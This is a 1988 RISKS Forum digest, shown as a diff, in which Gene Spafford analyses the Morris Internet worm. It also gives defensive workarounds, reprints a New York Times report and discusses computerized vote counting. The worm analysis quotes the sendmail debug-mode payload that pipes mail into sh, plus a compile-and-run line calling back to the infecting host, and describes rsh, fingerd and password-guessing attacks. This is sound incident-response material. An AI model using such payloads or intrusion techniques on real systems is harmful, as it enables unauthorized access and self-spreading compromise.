@@ -1,0 +1,414 @@
+RISKS-LIST: RISKS-FORUM Digest  Thursday 3 November 1988   Volume 7 : Issue 70
+
+        FORUM ON RISKS TO THE PUBLIC IN COMPUTERS AND RELATED SYSTEMS 
+   ACM Committee on Computers and Public Policy, Peter G. Neumann, moderator
+
+Contents:
+  Updated worm report (Gene Spafford)
+  A worm "condom" (Gene Spafford)
+  A cure!!!!! (Gene Spafford)
+  Computer Network Disrupted by `Virus' (John Markoff via Geoff Goodfellow)
+  "Annals of Democracy -- Counting Votes" in the New Yorker (Daniel B Dobkin)
+  Comments on the New Yorker article (PGN)
+
+The RISKS Forum is moderated.  Contributions should be relevant, sound, in good
+taste, objective, coherent, concise, and nonrepetitious.  Diversity is welcome.
+CONTRIBUTIONS to RISKS@CSL.SRI.COM, with relevant, substantive "Subject:" line
+(otherwise they may be ignored).  REQUESTS to RISKS-Request@CSL.SRI.COM.
+FOR VOL i ISSUE j / ftp kl.sri.com / login anonymous (ANY NONNULL PASSWORD) /
+  get stripe:<risks>risks-i.j ... (OR TRY cd stripe:<risks> / get risks-i.j ...
+  Volume summaries in (i, max j) = (1,46),(2,57),(3,92),(4,97),(5,85),(6,95).
+
+----------------------------------------------------------------------
+
+Date: Fri, 04 Nov 88 00:27:54 EST
+From: Gene Spafford <spaf@purdue.edu>
+Subject: Updated worm report
+Organization: SERC, Department of Computer Sciences, Purdue Univ.
+
+This is an updated description of how the worm works (note: it is 
+technically a worm, not a virus, since it does not attach itself
+to other code {that we know about}):
+
+All of our Vaxen and some of our Suns here were infected with the worm.  The
+worm forks repeated copies of itself as it tries to spread itself, and the load
+averages on the infected machines skyrocketed.  In fact, it got to the point
+that some of the machines ran out of swap space and kernel table entries,
+preventing login to even see what was going on!
+
+The worm seems to consist of two parts.  The way that it works is as
+follows:
+
+1) Virus running on an infected machine opens a TCP connection to a
+victim machine's sendmail, invokes debug mode, and submits a version
+of itself as a mail message.
+*OR* it uses rsh to create itself on the remote machine through
+an account requiring no password (due to hosts.equiv or .rhosts
+entries).  *OR* it gets in via a bug in fingerd *OR* it uses telnet
+(more on this later).
+
+Using the sendmail route, it does something like:
+From: /dev/null
+To: "|sed -e 1,/^$/d | sh; exit 0"
+
+cd /usr/tmp
+cat > x14481910.c <<'EOF'
+<text of program deleted?
+EOF
+cc -o x14481910 x14481910.c;x14481910 128.10.2.215 32341 8712440;rm -f x14481910 x14481910.c
+
+
+2) This program is a simple "listener" or "helper" program of about a hundred
+lines of fairly simple code.  As you can see, the helper is invoked with
+arguments pointing back at the infecting worm (giving hostid/socket/checksum(?)
+as arguments).
+
+3) The helper then connects to the "server" and copies a number of files
+(presumably to /tmp).  After the files are copied, it exec's a shell with
+standard input coming from the infecting worm program on the other end of the
+socket.
+
+From here, I speculate on what happens since I can't find the source to
+this part lying around on our machines:
+
+4) The newly exec'd shell attempts to compile itself from the files copied over
+to the target machine.  The command file it uses is as follows:
+
+PATH=/bin:/usr/bin:/usr/ucb
+rm -f sh
+if [ -f sh ]
+then
+P=x%d
+else
+P=sh
+cc -o $P %s
+/bin/echo %s
+./$P -p $$ 
+
+5) This creates and dispatches the new worm..  This worm opens all the worm
+source files, then unlinks the files so they can't be found (since it has them
+open, however, it can still access the contents).  Next, the worm steps through
+the hosts file (on the Sun, it uses YP to step through the distributed hosts
+file) trying to connect to other machines' sendmail.  If a connection succeeds,
+it forks a child process to infect it, while the parent continues to attempt
+infection of other machines.
+
+6) The child requests and initializes a new socket, then builds and invokes a
+listener with the new socket number and hostid as arguments (#1, above).
+
+
+Other notes:
+
+The worm runs in stages.  It first collects info from the /etc/hosts files, the
+hosts.equiv file, and other files containing host names and host IP addresses.
+It even runs netstat to find out what networks the machine is attached to! It
+uses this information to attempt to penetrate sendmail on those machines.  It
+also knows how to penetrate "fingerd" on Vaxen (on Suns, the attempt results in
+a core dump).  I will privately tell individuals how to fix the bug in fingerd,
+but for now change it so it does not run as "root".
+
+After this first stage, it appears to sleep for a while.  Then it starts
+collecting user names and it begins probing with "rsh".  It also tries to
+attack the passwords by trying a set of built-in words, the contents of
+/usr/dict, and words snarfed from system files.  If it succeeds in breaking a
+local password, it forks a child to use telnet to break into that account and
+copy itself.
+
+As I write this, no one seems to know what it is supposed to eventually do.
+Perhaps it just breaks in everywhere it can.  We do know that if it doesn't
+break into any accounts or systems for a while, it enters a mode where it tries
+to break the root password via brute force searching.  We suspect that if it
+succeeds it then does very nasty things.
+
+Other notes:
+
+The program corrupts its argument vector, so it appears in a "ps ax" as "(sh)"
+(a login shell).  Don't trust any of these if you have them running.
+
+The program doesn't copy around source files (except the helper) -- it copies
+around pre-compiled binaries that are linked on the local machine and then run.
+The worm appears to only be carrying binaries for 68020-based Suns and Vax 7xx
+and 8800 machines.  Pyramids, Sun 2's and Sequents are all definitely immune.
+(Note: an infected 8800 is an awesome engine of contagion.)
+
+The strings in the binaries are encrypted against a random "strings"
+invocation.  If you have a binary, Keith Bostic informs me that Xor with 0x81
+will reveal interesting things, although that is not the only mask used.
+
+The first observation of the virus I have heard about was 6pm Wednesday night
+in Pittsburgh.  It didn't hit Purdue until about 4 this morning.  We were lucky
+in that other sites, like CMU and Princeton, were hit around 11 last night.
+
+
+Acknowledgements:  Some of the above information was obtained from
+Brian Kantor (UCSD), Keith Bostic (UCB), Thomas Narten (Purdue), Dan
+Trinkle (Purdue), Kevin Braunsdorf (Purdue) and Miek Rowan (Purdue).
+Thanks, guys.
+
+------------------------------
+
+Date: Thu, 03 Nov 88 21:20:10 EST
+From: Gene Spafford <spaf@purdue.edu>
+Subject: A worm "condom" 
+Organization: SERC, Department of Computer Sciences, Purdue Univ.
+
+... Kevin Braunsdorf & Rich Kulawiec (Purdue-CC) have come up with a "condom"
+to protect your machine against the CURRENT worm.  They are not 100% sure it
+works, but it seems to be completely effective and it can't do any harm.  As
+ROOT, do:
+
+mkdir /usr/tmp/sh
+chmod 111 /usr/tmp/sh
+
+Then edit your rc.local file to recreate the directory in case of a reboot.
+This will not stop a current infection, but it will prevent any new ones
+from taking hold -- it prevents the worm from creating replicas.
+
+... --spaf
+
+------------------------------
+
+Date: Thu, 03 Nov 88 22:04:15 EST
+From: Gene Spafford <spaf@purdue.edu>
+Subject: A cure!!!!!
+Organization: SERC, Department of Computer Sciences, Purdue Univ.
+
+FLASH!!
+
+Kevin ("Adb's your friend.") Braunsdorf just burst into my office
+with a cure discovered in the disassembled worm binary.
+
+If there is an external variable in the library named "pleasequit" that is
+non-zero, the worm will die immediately after exiting.  Thus, to kill any new
+worms, include a patch in your library that defines the symbol.  The following
+shell file and source code will modify your C library to define this symbol.
+
+It WON'T kill any currently linked and running versions, but it will
+prevent reinfection.
+
+
+# Shar archive.  Give the following as input to /bin/sh
+#  Packed Thu Nov  3 21:56:35 EST 1988 by spaf@uther.cs.purdue.edu
+#
+#  This archive contains:
+#	foo.sh
+#	foo.c
+#
+#
+echo x - foo.sh
+sed 's/^X//' >foo.sh <<'*-*-END-of-foo.sh-*-*'
+Xcc -c foo.c -o foo.o
+Xcp /lib/libc.a /lib/libc.a.old
+Xar q /lib/libc.a foo.o
+Xranlib /lib/libc.a
+*-*-END-of-foo.sh-*-*
+echo x - foo.c
+sed 's/^X//' >foo.c <<'*-*-END-of-foo.c-*-*'
+Xextern int pleasequit = -1;
+*-*-END-of-foo.c-*-*
+exit
+
+------------------------------
+
+Date: Thu, 3 Nov 88 21:30:19 PST
+From: geoff@fernwood.mpk.ca.us (the tty of Geoff Goodfellow)
+Subject: Computer Network Disrupted by `Virus'
+
+COMPUTER NETWORK DISRUPTED BY `VIRUS'
+By JOHN MARKOFF=
+c.1988 N.Y. Times News Service=
+
+	   In an intrusion that raises new questions about the
+vulnerability of the nation's computers, a nationwide Department of
+Defense data network has been disrupted since Wednesday night by a
+rapidly spreading ``virus'' software program apparently introduced
+by a computer science student's malicious experiment.
+	   The program reproduced itself through the computer network,
+making hundreds of copies in each machine it reached, effectively
+clogging systems linking thousands of military, corporate and
+university computers around the country and preventing them from
+doing additional work. The virus is thought not to have destroyed
+any files.
+	   By late Thursday afternoon computer security experts were
+calling the virus the largest assault ever on the nation's
+computers.
+	   ``The big issue is that a relatively benign software program can
+virtually bring our computing community to its knees and keep it
+there for some time,'' said Chuck Cole, deputy computer security
+manager at Lawerence Livermore Laboratory in Livermore, Calif., one
+of the sites affected by the intrusion. ``The cost is going to be
+staggering.''
+	   Clifford Stoll,^ @a computer security expert at Harvard
+University, added: ``There is not one system manager who is not
+tearing his hair out. It's causing enormous headaches.''
+	   The affected computers carry routine communications among
+military officials, researchers and corporations.
+	   While some sensitive military data are involved, the nation's
+most sensitive secret information, such as that on the control of
+nuclear weapons, is thought not to have been touched by the virus.
+	   Computer viruses are so named because they parallel in the
+computer world the behavior of biological viruses. A virus is a
+program, or a set of instructions to a computer, that is
+deliberately planted on a floppy disk meant to be used with the
+computer or introduced when the computer is communicating over
+telephone lines or data networks with other computers.
+	   The programs can copy themselves into the computer's master
+software, or operating system, usually without calling any
+attention to themselves. From there, the program can be passed to
+additional computers.
+	   Depending upon the intent of the software's creator, the program
+might cause a provocative but otherwise harmless message to appear
+on the computer's screen. Or it could systematically destroy data
+in the computer's memory.
+	   The virus program was apparently the result of an experiment by
+a computer science graduate student trying to sneak what he thought
+was a harmless virus into the Arpanet computer network, which is
+used by universities, military contractors and the Pentagon, where
+the software program would remain undetected.
+	 A man who said he was an associate of the student said in a telephone
+call to The New York Times that the experiment went awry because of a small
+programming mistake that caused the virus to multiply around the military
+network hundreds of times faster than had been planned.
+	   The caller, who refused to identify himself or the programmer,
+said the student realized his error shortly after letting the
+program loose and that he was now terrified of the consequences.
+	   A spokesman at the Pentagon's Defense Communications Agency,
+which has set up an emergency center to deal with the problem, said
+the caller's story was a ``plausible explanation of the events.''
+	   As the virus spread Wednesday night, computer experts began a
+huge struggle to eradicate the invader.
+	   A spokesman for the Defense Communications Agency in Washington
+acknowledged the attack, saying, ``A virus has been identified in
+several host computers attached to the Arpanet and the unclassified
+portion of the defense data network known as the Milnet.''
+	   He said that corrections to the security flaws exploited by the
+virus are now being developed.
+	   The Arpanet data communications network was established in 1969
+and is designed to permit computer researchers to share electronic
+messages, programs and data such as project information, budget
+projections and research results.
+	   In 1983 the network was split and the second network, called
+Milnet, was reserved for higher-security military communications.
+But Milnet is thought not to handle the most classified military
+information, including data related to the control of nuclear
+weapons.
+	   The Arpanet and Milnet networks are connected to hundreds of
+civilian networks that link computers around the globe.
+	   There were reports of the virus at hundreds of locations on both
+coasts, including, on the East Coast, computers at the
+Massachusetts Institute of Technology, Harvard University, the
+Naval Research Laboratory in Maryland and the University of
+Maryland and, on the West Coast, NASA's Ames Research Center in
+Mountain View, Calif.; Lawrence Livermore Laboratories; Stanford
+University; SRI International in Menlo Park, Calif.; the University
+of California's Berkeley and San Diego campuses and the Naval Ocean
+Systems Command in San Diego.
+	   A spokesman at the Naval Ocean Systems Command said that its
+computer systems had been attacked Wednesday evening and that the
+virus had disabled many of the systems by overloading them. He said
+that computer programs at the facility were still working on the
+problem more than 19 hours after the original incident.
+	   The unidentified caller said the Arpanet virus was intended
+simply to ``live'' secretly in the Arpanet network by slowly
+copying itself from computer to computer. However, because the
+designer did not completely understand how the network worked, it
+quickly copied itself thousands of times from machine to machine.
+	 Computer experts who disassembled the program said that it was written
+with remarkable skill and that it exploited three security flaws in the Arpanet
+network.  [No. Actually UNIX] The virus' design included a program designed to
+steal passwords, then masquerade as a legitimate user to copy itself to a
+remote machine.
+	   Computer security experts said that the episode illustrated the
+vulnerability of computer systems and that incidents like this
+could be expected to happen repeatedly if awareness about computer
+security risks was not heightened.
+	   ``This was an accident waiting to happen; we deserved it,'' said
+Geoffrey Goodfellow,''(*) president of Anterior Technology Inc. and an
+expert on computer communications.
+	   ``We needed something like this to bring us to our senses. We
+have not been paying much attention to protecting ourselves.''
+	   Peter Neumann, a computer security expert at SRI International
+Inc. in Menlo Park International, said: ``Thus far the disasters we
+have known have been relatively minor. The potential for rather
+extraordinary destruction is rather substantial.
+	 ``In most of the cases we know of, the damage has been immediately
+evident. But if you contemplate the effects of hidden programs, you could
+have attacks going on and you might never know it.''
+
+  [* Following is Geoff's full quote ("exploitation"), which John only
+  partially integrated with Geoff's earlier off-the-cuff comment ("accident"):
+
+    "This was an exploitation wanting to happen.  We deserved it.  We needed
+    something like this to bring us to our senses.  We have not been paying
+    much attention to protecting ourselves.  The blame does not rest on the R&D
+    community as a whole.  Look how many manufacturers [...] just took the
+    original computer-science-department developed code willy-nilly, put their
+    wrapper and corporate logo on it, and resold it to customers.  That's the
+    real travesty here, we build these systems, OK, that's great, but we rarely
+    build them and then ask how they might be abused, broken, or circumvented"
+    {and then try to break them}.   ]
+
+------------------------------
+
+Date: Thu 3 Nov 88 11:18:09-EDT
+From: Daniel B Dobkin <DAN%Irving@VX1.GBA.NYU.EDU>
+Subject: "Annals of Democracy -- Counting Votes" in the New Yorker
+
+The current (7 November 88) issue of The New Yorker contains an article by
+Ronnie Dugger on "Counting Votes" -- the spreading use of computerized vote
+tabulation in jurisdictions around the country.  It confirms what we all know,
+or should know: the unprecedented potential for fraud, let alone the very real
+possibilities for "computer error", make this a giant step backwards for
+democracy and universal suffrage.
+
+A number of the "experts" interviewed admitted that the potential for fraud --
+or outright stealing the election -- exists, but brushed it off with a
+perfunctory, "I don't know of any cases yet where that has happened."  To my
+mind, that is exactly the point: the fact that you don't know about it can just
+as easily be cited to indicate that it HAS happened; after all, you aren't
+SUPPOSED to know about it.
+
+Other highlights of the article include interviews with Michael Shamos,
+formerly of UniLogic (now Scribe Systems); and Peter Neumann, of SRI
+International, the moderator of the RISKS digest.
+
+------------------------------
+
+Date: Thu, 3 Nov 1988 22:18:11 PDT
+From: Peter Neumann <neumann@kl.sri.com>
+Subject: Comments on the New Yorker article
+
+For the record, in Ronnie Dugger's interview with me, we discussed at length
+(1) the potential risks of using today's conventional computer system
+technology in elections, and (2) what one might do to try to develop a system
+that would avoid many of those risks -- although admittedly it could not be
+perfect.  I presume that Howard Strauss (who is also quoted, and whose report
+"Ensuring the Integrity of Electronic Elections" with Jon Edwards outlines what
+they consider to be necessary procedural controls) also stressed his published
+recommendations.  Apparently Dugger chose to emphasize the risks, and downplay
+discussion of constructive design techniques and operational procedures.  He
+does note that New York City is currently engaged in the competitive
+procurement and development of a new system, but does not indicate that the
+specified requirements (e.g., complete enchipment, no software [and
+consequently no software modification], privacy, integrity, separation of
+duties, extensive redundancy and cross-checking, reproducibility of results,
+physical and electronic isolation, procedural controls, ...) are vastly more
+stringent that anything that exists today.  So, perhaps the prospects for the
+future are substantially more optimistic than he has portrayed.
+
+Incidentally, "A Special Report on Computing and Elections", 11 pp., a joint
+publication from ELECTION WATCH, a project of the Urban Policy Research
+Institute, and from the CPSR/Portland Computer Voting Project, Computer
+Professionals for Social Responsibility, is available from either CPSR, PO Box
+717, Palo Alto CA 94301, 415-322-3778, or UPRI, 530 Paseo Miramar, Pacific
+Palisades CA 90272, 213-459-4982.  In addition, papers by Wilcox and Nilsson
+and by Strauss and Edwards are available for $5 (for both) from CPSR.  The full
+report by Strauss and Edwards is available from Howard Strauss, 116 Prospect
+Ave., Princeton NJ 08544 for $8.  Costs are for copying, handling, and postage
+only.  [I have previously noted reports by Roy G. Saltman and by Lance J.
+Hoffman in RISKS-7.52.]
+
+------------------------------
+
+End of RISKS-FORUM Digest 7.70
+************************
